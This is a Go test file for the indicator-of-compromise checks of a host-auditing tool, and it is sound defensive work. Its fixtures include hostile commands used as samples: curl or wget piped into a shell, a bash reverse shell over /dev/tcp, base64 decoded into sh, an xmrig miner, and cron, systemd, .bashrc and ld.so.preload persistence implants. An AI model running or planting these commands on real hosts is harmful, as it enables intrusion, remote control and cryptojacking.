package compromise

import (
	"crypto/md5"
	"encoding/hex"
	"fmt"
	"slices"
	"testing"
	"time"

	"github.com/RatulSikder97/hostwarden/internal/audit"
	"github.com/RatulSikder97/hostwarden/internal/testutil"
)

func TestSuspiciousReasons(t *testing.T) {
	t.Parallel()
	tests := []struct {
		cmd  string
		want int
	}{
		{"cd / && run-parts --report /etc/cron.hourly", 0},
		{"/usr/bin/certbot renew --quiet > /tmp/certbot.log 2>&1", 0},
		{"test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )", 0},
		{"curl -fsSL http://203.0.113.9/x.sh | sh", 1},
		{"wget -q -O- http://203.0.113.9/x | bash", 1},
		{"echo aGk= | base64 -d | sh", 1},
		{"/tmp/.x/run", 1},
		{"nohup /dev/shm/kworker &", 1},
		{"bash -i >& /dev/tcp/198.51.100.4/4444 0>&1", 1},
		{"chattr +i /etc/ld.so.preload", 1},
		{"./xmrig -o stratum+tcp://pool.example.invalid:3333 --donate-level 1", 3},
		{"/usr/local/bin/kinsing", 1},
		{"/usr/local/bin/mixmrigation", 0},
	}
	for _, tc := range tests {
		t.Run(tc.cmd, func(t *testing.T) {
			t.Parallel()
			if got := suspiciousReasons(tc.cmd); len(got) != tc.want {
				t.Errorf("reasons = %q, want %d", got, tc.want)
			}
		})
	}
}

func TestCronCommand(t *testing.T) {
	t.Parallel()
	tests := []struct {
		line    string
		userFld bool
		wantCmd string
	}{
		{"*/5 * * * * root curl x | sh", true, "curl x | sh"},
		{"*/5 * * * * curl x | sh", false, "curl x | sh"},
		{"@reboot /tmp/x", false, "/tmp/x"},
		{"@reboot root /tmp/x", true, "/tmp/x"},
		{"SHELL=/bin/sh", true, ""},
		{"# comment", true, ""},
		{"* * * *", true, ""},
	}
	for _, tc := range tests {
		if got := cronCommand(tc.line, tc.userFld); got != tc.wantCmd {
			t.Errorf("cronCommand(%q, %v) = %q, want %q", tc.line, tc.userFld, got, tc.wantCmd)
		}
	}
}

func stat(pid int, comm string, utime, start int) string {
	return fmt.Sprintf("%d (%s) S 1 %d %d 0 -1 4194560 100 0 0 0 %d 0 0 0 20 0 1 0 %d 1000 200\n", pid, comm, pid, pid, utime, start)
}

func TestProcessIndicators(t *testing.T) {
	t.Parallel()
	tree := testutil.Tree{
		"proc/uptime": {Content: "10000.00 1.00\n"},
		// Normal daemon.
		"proc/10/comm": {Content: "nginx\n"}, "proc/10/cmdline": {Content: "nginx: master process\x00"},
		"proc/10/stat": {Content: stat(10, "nginx", 100, 100)}, "proc/10/exe": {Link: "/usr/sbin/nginx"},
		// Upgraded daemon awaiting restart.
		"proc/11/comm": {Content: "sshd\n"}, "proc/11/stat": {Content: stat(11, "sshd", 1, 100)},
		"proc/11/exe": {Link: "/usr/sbin/sshd (deleted)"},
		// Fileless payload.
		"proc/12/comm": {Content: "x\n"}, "proc/12/stat": {Content: stat(12, "x", 1, 100)},
		"proc/12/exe": {Link: "/memfd:x (deleted)"},
		// Renamed miner by arguments, running from /dev/shm.
		"proc/13/comm": {Content: "systemd-journal\n"}, "proc/13/cmdline": {Content: "/dev/shm/.j/systemd-journal\x00-a\x00rx/0\x00"},
		"proc/13/stat": {Content: stat(13, "systemd-journal", 10, 100)}, "proc/13/exe": {Link: "/dev/shm/.j/systemd-journal"},
		// Hidden high-CPU binary with no other signal.
		"proc/14/comm": {Content: "kthreadd2\n"}, "proc/14/stat": {Content: stat(14, "kthreadd2", 900000, 100)},
		"proc/14/exe": {Link: "/opt/.cache/kthreadd2"},
		// Busy but legitimate.
		"proc/15/comm": {Content: "postgres\n"}, "proc/15/stat": {Content: stat(15, "postgres", 900000, 100)},
		"proc/15/exe": {Link: "/usr/lib/postgresql/15/bin/postgres"},
		// Kernel thread: no exe.
		"proc/2/comm": {Content: "kthreadd\n"}, "proc/2/stat": {Content: stat(2, "kthreadd", 0, 0)},
	}
	h := testutil.Host(testutil.Build(t, tree))
	tests := []struct {
		check string
		want  map[string]audit.Severity
	}{
		{"HW-IOC-005", map[string]audit.Severity{"pid:11": audit.Low, "pid:12": audit.Critical}},
		{"HW-IOC-006", map[string]audit.Severity{"pid:13": audit.SeverityUnset}},
		{"HW-IOC-007", map[string]audit.Severity{"pid:13": audit.Critical, "pid:14": audit.High}},
	}
	for _, tc := range tests {
		t.Run(tc.check, func(t *testing.T) {
			t.Parallel()
			got, err := testutil.RunCheck(t, Checks(), tc.check, h)
			if err != nil {
				t.Fatal(err)
			}
			if len(got) != len(tc.want) {
				t.Fatalf("targets = %v, want %v", testutil.Targets(got), tc.want)
			}
			for _, f := range got {
				want, ok := tc.want[f.Target]
				if !ok {
					t.Errorf("unexpected finding %s: %s", f.Target, f.Message)
				} else if want != audit.SeverityUnset && f.Severity != want {
					t.Errorf("%s severity = %v, want %v", f.Target, f.Severity, want)
				}
			}
		})
	}
}

func TestPersistenceFiles(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name  string
		check string
		tree  testutil.Tree
		want  []string
	}{
		{"empty preload", "HW-IOC-001", testutil.Tree{"etc/ld.so.preload": {Content: "# none\n\n"}}, nil},
		{"preload rootkit", "HW-IOC-001", testutil.Tree{"etc/ld.so.preload": {Content: "/lib/x86_64-linux-gnu/libsystem.so\n"}}, []string{"/etc/ld.so.preload:1"}},
		{"global LD_PRELOAD", "HW-IOC-001", testutil.Tree{"etc/environment": {Content: "PATH=/usr/bin\nLD_PRELOAD=/tmp/x.so\n"}}, []string{"/etc/environment:2"}},
		{"benign cron", "HW-IOC-002", testutil.Tree{"etc/cron.d/certbot": {Content: "0 */12 * * * root certbot -q renew\n"}}, nil},
		{"cron dropper", "HW-IOC-002", testutil.Tree{
			"etc/cron.d/apache":              {Content: "SHELL=/bin/sh\n* * * * * root wget -q -O - http://203.0.113.7/a | sh\n"},
			"var/spool/cron/crontabs/nobody": {Content: "@reboot /var/tmp/.k/kswapd0\n"},
			"etc/cron.daily/logrotate":       {Content: "#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n"},
			"etc/cron.hourly/0anacron":       {Content: "#!/bin/sh\ncurl -s http://203.0.113.7/u | bash\n"},
		}, []string{"/etc/cron.d/apache:2", "/var/spool/cron/crontabs/nobody:1", "/etc/cron.hourly/0anacron:2"}},
		{"benign unit", "HW-IOC-003", testutil.Tree{"etc/systemd/system/app.service": {Content: "[Service]\nExecStart=/usr/local/bin/app --port 8080\n"}}, nil},
		{"malicious unit", "HW-IOC-003", testutil.Tree{
			"etc/systemd/system/dbus-helper.service": {Content: "[Service]\nExecStartPre=-/bin/true\nExecStart=/bin/bash -c '/dev/shm/.d/dbus -c /dev/shm/.d/config.json'\n"},
		}, []string{"/etc/systemd/system/dbus-helper.service:3"}},
		{"user unit", "HW-IOC-003", testutil.Tree{
			"etc/passwd": {Content: "dev:x:1000:1000::/home/dev:/bin/bash\n"},
			"home/dev/.config/systemd/user/sync.service": {Content: "[Service]\nExecStart=/home/dev/.local/xmrig\n"},
		}, []string{"/home/dev/.config/systemd/user/sync.service:2"}},
		{"bashrc implant", "HW-IOC-004", testutil.Tree{
			"etc/passwd":   {Content: "root:x:0:0::/root:/bin/bash\n"},
			"root/.bashrc": {Content: "alias ll='ls -l'\n(curl -s http://203.0.113.7/k | sh) >/dev/null 2>&1 &\n"},
			"etc/rc.local": {Content: "#!/bin/sh\nexit 0\n"},
		}, []string{"/root/.bashrc:2"}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got, err := testutil.RunCheck(t, Checks(), tc.check, testutil.Host(testutil.Build(t, tc.tree)))
			if err != nil {
				t.Fatal(err)
			}
			if !slices.Equal(testutil.Targets(got), tc.want) {
				t.Errorf("targets = %v, want %v", testutil.Targets(got), tc.want)
			}
		})
	}
}

func TestRecentAndIntegrity(t *testing.T) {
	t.Parallel()
	good := []byte("original")
	sum := md5.Sum(good)
	tree := testutil.Tree{
		"etc/passwd":                               {Content: "root:x:0:0::/root:/bin/bash\nops:x:1000:1000::/home/ops:/bin/bash\n"},
		"root/.ssh/authorized_keys":                {Content: "", Age: 2 * time.Hour},
		"home/ops/.ssh/authorized_keys":            {Content: ""},
		"usr/bin/ps":                               {Content: "trojan", Age: time.Hour},
		"usr/bin/ls":                               {Content: string(good)},
		"usr/sbin/sshd":                            {Content: string(good)},
		"usr/share/doc/readme":                     {Content: "x", Age: time.Hour},
		"var/lib/dpkg/info/procps.md5sums":         {Content: hex.EncodeToString(sum[:]) + "  usr/bin/ps\n"},
		"var/lib/dpkg/info/coreutils.md5sums":      {Content: hex.EncodeToString(sum[:]) + "  usr/bin/ls\n" + hex.EncodeToString(sum[:]) + "  usr/share/doc/readme\n"},
		"var/lib/dpkg/info/openssh-server.md5sums": {Content: hex.EncodeToString(sum[:]) + "  usr/sbin/sshd\n"},
	}
	h := testutil.Host(testutil.Build(t, tree))
	for _, tc := range []struct {
		check string
		want  []string
	}{
		{"HW-IOC-009", []string{"/usr/bin"}},
		{"HW-IOC-010", []string{"/root/.ssh/authorized_keys"}},
		{"HW-IOC-011", []string{"/usr/bin/ps"}},
	} {
		got, err := testutil.RunCheck(t, Checks(), tc.check, h)
		if err != nil {
			t.Fatal(err)
		}
		if !slices.Equal(testutil.Targets(got), tc.want) {
			t.Errorf("%s targets = %v, want %v", tc.check, testutil.Targets(got), tc.want)
		}
	}
	if _, err := testutil.RunCheck(t, Checks(), "HW-IOC-011", testutil.Host(t.TempDir())); err == nil {
		t.Error("HW-IOC-011 should skip on non-dpkg hosts")
	}
}
